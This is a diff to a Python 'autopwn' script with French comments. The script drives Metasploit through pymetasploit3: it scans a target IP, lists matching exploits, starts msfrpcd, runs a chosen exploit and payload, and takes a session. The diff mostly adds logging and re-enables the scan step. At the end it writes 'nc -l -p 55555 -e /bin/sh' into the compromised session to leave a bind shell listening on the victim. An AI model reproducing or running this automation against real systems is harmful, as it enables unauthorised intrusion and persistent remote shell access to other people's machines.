@@ -5,6 +5,7 @@ import pprint
 import json
 from pymetasploit3.msfrpc import MsfRpcClient
 import time
+from logs import LOG
 
 PROMPT = "pwnguin@victim~ "
 
@@ -24,6 +25,10 @@ CRITICAL = RED + "Critical" + RESET
 
 SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}
 
+
+logfile = open("./logtest", "a+")
+
+LOG("Launched autopwn.",logfile,"inf")
 
 def show_pwnguin():
     """Displays pwngin ASCII art logo, nothing useful"""
@@ -50,29 +55,65 @@ def show_pwnguin():
     )
 
 
-IP = "192.168.1.45"
-CMD = "./explookup.sh " + IP
+IP = "127.0.0.1" # "192.168.1.45"
+CMD = "./explookup.sh " + IP + " >> /dev/null" # Sortie standard dans /dev/null pour la lisibilité, à changer
 EXPLOIT_LIST = "./exploit_list"
 
 show_pwnguin()
 time.sleep(3)
 
-# scan = subprocess.run(CMD, shell=True)
+scan = subprocess.run(CMD, shell=True)
 
-# if scan:
-#     print("[i] Launching scan over @" + IP + " cmd :" + "CMD")
+if scan:
+    msg = "Launching scan over @" + IP + " cmd :" + CMD
+    print("[i] Launching scan over @" + IP + " cmd :" + CMD)
+    LOG(msg,logfile,"log")
+else:
+    LOG("Error 1 : nmap failed.",logfile,"err")
+    print("[X] Error 1 : nmap failed.")
+    exit(-1)
 
 with open(EXPLOIT_LIST, "r+") as f:
     result = json.loads(f.read())
+LOG("Imported exploit_list",logfile,"log")
 
-titles = []
-for k, pwn in enumerate(result):
-    titles.append([k, pwn["Title"]])
+pprint.pprint(result[0]['RESULTS_EXPLOIT'][0]['Title'])
+
+if result:
+    titles=[]
+    for i in range(len(result)):
+        pwn = result[i]['RESULTS_EXPLOIT']
+        for k in range(len(pwn)):
+            titles.append(pwn[k]['Title'])
+else:
+    LOG("Error 2 : Parsing error.",logfile,"err")
+    print("[X] Error 2 : Parsing error.")
+    exit(-2)
+LOG("Parsed ./exploit_list",logfile,"log")
+
+
+# if result:
+#     titles = []
+#     for i in range(len(result)):
+#         for k, pwn in enumerate(result):
+#             pprint.pprint(pwn['RESULTS_EXPLOIT'][k]['Title'])
+#             titles.append([k, pwn['RESULTS_EXPLOIT'][k]['Title']])
+# else:
+#     LOG("Error 2 : Parsing error.",logfile,"err")
+#     print("[X] Error 2 : Parsing error.")
+#     exit(-2)
+# LOG("Parsed ./exploit_list",logfile,"log")
+
 
 print("[~] Possible exploits :")
 if titles:
     pprint.pprint(titles)
     print("\n")
+else:
+    LOG("Error 3 : No exploit found on Metasploit.",logfile,"err")
+    print("[X] Error 3 : No exploit found on Metasploit.")
+    exit(-3)
+LOG("Displayed possible exploits to user",logfile,"log")
 
 choice = input("[~] Please select an exploit: ")
 attack = titles[int(choice)][1][:-12]
@@ -80,12 +121,15 @@ attack = titles[int(choice)][1][:-12]
 print("[V] Exploit selected ! :")
 print(attack)
 print("\n")
+LOG("User selected " + attack,logfile,"log")
 
 print("Starting msfrpcd...")
 proc = subprocess.run("msfrpcd -P yourpassword", shell=True)
 time.sleep(5)
+LOG("Started process msfrpcd" + attack,logfile,"inf")
 
-# proc = subprocess.run("msfdb reinit", shell=True) # if db problem
+proc = subprocess.run("msfdb reinit", shell=True) # if db problem
+LOG("Started process msfdb (arg reinit)" + attack,logfile,"inf")
 
 client = MsfRpcClient("yourpassword", ssl=True)
 print("\n")
@@ -97,7 +141,9 @@ for mod in modules:
     modulus.append([mod["type"], mod["fullname"]])
 
 print("[~] Available modules :")
-pprint.pprint(modulus)
+for k in range(len(modulus)):
+    pprint.pprint(str(k) + " : " + modulus[k][0] + " : " + modulus[k][1])
+LOG("Displayed modules",logfile,"log")
 
 
 exploit = client.modules.use(modulus[0][0], modulus[0][1])
@@ -114,7 +160,7 @@ pprint.pprint(plds)
 pay_idx = int(input("Which payload do you want to use ? : "))
 payload = client.modules.use("payload", plds[pay_idx])
 print("[V] Payload selected !")
-
+LOG("User selected payload",logfile,"log")
 print(payload.missing_required)
 print("\n")
 
@@ -129,9 +175,10 @@ print(client.sessions.list)
 print("\n")
 
 shell = client.sessions.session("1")
+LOG("Shell obtained",logfile,"log")
 
 print("[~] Entering command and control section")
-
+LOG("Entered in C&C section",logfile,"inf")
 # Idée : définir des séquences de commandes pour encore + automatiser le pwn d'un point de vue user
 
 #sequence = ["whoami",
@@ -149,9 +196,14 @@ if shell:
     shell.write("nc -l -p 55555 -e /bin/sh")
     print("\n")
 else:
-    print("[X] Error 1 : Could not get a shell.")
-    exit(-1)
+    LOG("Error 4 : Could not get a shell.",logfile,"err")
+    print("[X] Error 4 : Could not get a shell.")
+    exit(-4)
 
 print("[V] Pwn complete !!! ")
 print("[V] Listener available @ " + IP + ":55555 ")
+
+LOG("nc listener opened on target on port 55555",logfile,"log")
+LOG("END OF LOGS",logfile,"crit")
+logfile.close()
 exit(0)
